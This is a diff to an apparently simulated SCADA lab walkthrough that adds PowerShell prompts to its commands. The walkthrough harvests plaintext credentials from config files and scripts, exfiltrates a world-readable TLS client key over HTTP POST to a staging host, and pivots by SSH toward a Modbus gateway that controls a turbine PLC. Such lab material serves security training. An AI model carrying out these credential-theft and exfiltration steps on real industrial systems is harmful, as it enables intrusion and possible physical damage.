@@ -51,19 +51,19 @@ Password: `W1nd0ws@2016`. Drops into the Windows Server 2016 facade.
 ## Identity and host enumeration
 
 ```powershell
-whoami
+PS C:\Users\scada_admin> whoami
 ```
 
 Returns `ot.local\scada_admin`.
 
 ```powershell
-hostname
+PS C:\Users\scada_admin> hostname
 ```
 
 Returns `SCADA-SRV01`.
 
 ```powershell
-ipconfig
+PS C:\Users\scada_admin> ipconfig
 ```
 
 Single NIC at `10.10.2.20`. Operational zone only. No direct path to the
@@ -71,7 +71,7 @@ control network, but the stunnel client on this host gives authenticated Modbus
 access to `uupl-modbus-gw:8502`, which forwards to the turbine PLC.
 
 ```powershell
-netstat -ano
+PS C:\Users\scada_admin> netstat -ano
 ```
 
 Port 22 (sshd), port 8080 (Flask). Stunnel is listening on `127.0.0.1:5020`.
@@ -82,7 +82,7 @@ Modbus TCP.
 ## Configuration file
 
 ```powershell
-cat C:\SCADA\Config\scada.ini
+PS C:\Users\scada_admin> cat C:\SCADA\Config\scada.ini
 ```
 
 The complete credential set for this host and its dependencies:
@@ -94,7 +94,7 @@ The complete credential set for this host and its dependencies:
   to rotate it in 2022. The ticket was closed. It was not rotated.
 
 ```powershell
-cat C:\SCADA\Config\alarm_recipients.txt
+PS C:\Users\scada_admin> cat C:\SCADA\Config\alarm_recipients.txt
 ```
 
 Notification email addresses for critical and warning alarms. Useful for
@@ -103,7 +103,7 @@ understanding who gets paged when the process trips.
 ## Scripts
 
 ```powershell
-cat C:\SCADA\Scripts\send_alarm.bat
+PS C:\Users\scada_admin> cat C:\SCADA\Scripts\send_alarm.bat
 ```
 
 The SMTP alarm relay batch script. The password (`plantmail123`) is in a `set`
@@ -111,7 +111,7 @@ statement. Same credential as in `scada.ini` and in `send_alarm.ps1` on the
 engineering workstation.
 
 ```powershell
-cat C:\SCADA\Scripts\poll_historian.ps1
+PS C:\Users\scada_admin> cat C:\SCADA\Scripts\poll_historian.ps1
 ```
 
 Historian query script. The historian credentials (`hist_read / history2017`)
@@ -121,7 +121,7 @@ the last reading for each.
 ## Alarm log
 
 ```powershell
-cat C:\SCADA\Logs\alarm_log_2026.txt
+PS C:\Users\scada_admin> cat C:\SCADA\Logs\alarm_log_2026.txt
 ```
 
 Trip events with timestamps, asset names, measured values, and trip thresholds.
@@ -133,7 +133,7 @@ alarm threshold.
 ## PSReadLine history
 
 ```powershell
-cat AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+PS C:\Users\scada_admin> cat AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
 ```
 
 Prior sessions include historian API queries and an SSH session to the historian
@@ -143,7 +143,7 @@ and that the operator SSHes to it directly.
 ## Desktop quick reference
 
 ```powershell
-cat Desktop\README.txt
+PS C:\Users\scada_admin> cat Desktop\README.txt
 ```
 
 One-page reference card for the SCADA system: web URL, config path, historian
@@ -160,15 +160,15 @@ it. The permission was never tightened. Risk accepted 2020, ticket HEX-5103.
 The cert files are in `C:\SCADA\Config\certs\`.
 
 ```powershell
-dir C:\SCADA\Config\certs\
+PS C:\Users\scada_admin> dir C:\SCADA\Config\certs\
 ```
 
 Three files: `client.crt`, `client.key`, `ca.crt`. The key is world-readable.
 
 ```powershell
-cat C:\SCADA\Config\certs\client.key
-cat C:\SCADA\Config\certs\client.crt
-cat C:\SCADA\Config\certs\ca.crt
+PS C:\Users\scada_admin> cat C:\SCADA\Config\certs\client.key
+PS C:\Users\scada_admin> cat C:\SCADA\Config\certs\client.crt
+PS C:\Users\scada_admin> cat C:\SCADA\Config\certs\ca.crt
 ```
 
 PEM blocks. The operational zone has no direct route to unseen-gate; exfil via
@@ -176,9 +176,9 @@ wizzards-retreat (10.10.2.3), which is on the same subnet. Start the receiver th
 first, then send:
 
 ```powershell
-iwr -Method POST -Uri http://10.10.2.3:9999/client.key -InFile C:\SCADA\Config\certs\client.key
-iwr -Method POST -Uri http://10.10.2.3:9999/client.crt -InFile C:\SCADA\Config\certs\client.crt
-iwr -Method POST -Uri http://10.10.2.3:9999/ca.crt     -InFile C:\SCADA\Config\certs\ca.crt
+PS C:\Users\scada_admin> iwr -Method POST -Uri http://10.10.2.3:9999/client.key -InFile C:\SCADA\Config\certs\client.key
+PS C:\Users\scada_admin> iwr -Method POST -Uri http://10.10.2.3:9999/client.crt -InFile C:\SCADA\Config\certs\client.crt
+PS C:\Users\scada_admin> iwr -Method POST -Uri http://10.10.2.3:9999/ca.crt     -InFile C:\SCADA\Config\certs\ca.crt
 ```
 
 Receiver setup, pull to unseen-gate, and using the certs against the gateway:
@@ -193,8 +193,8 @@ plain Modbus TCP and has no further authentication.
 The SCADA server is primarily a credential aggregation point. From here:
 
 ```powershell
-ssh hist_admin@10.10.2.10
-ssh engineer@10.10.2.30
+PS C:\Users\scada_admin> ssh hist_admin@10.10.2.10
+PS C:\Users\scada_admin> ssh engineer@10.10.2.30
 ```
 
 Both credentials are in `scada.ini`. The historian SSH opens the `/ingest`
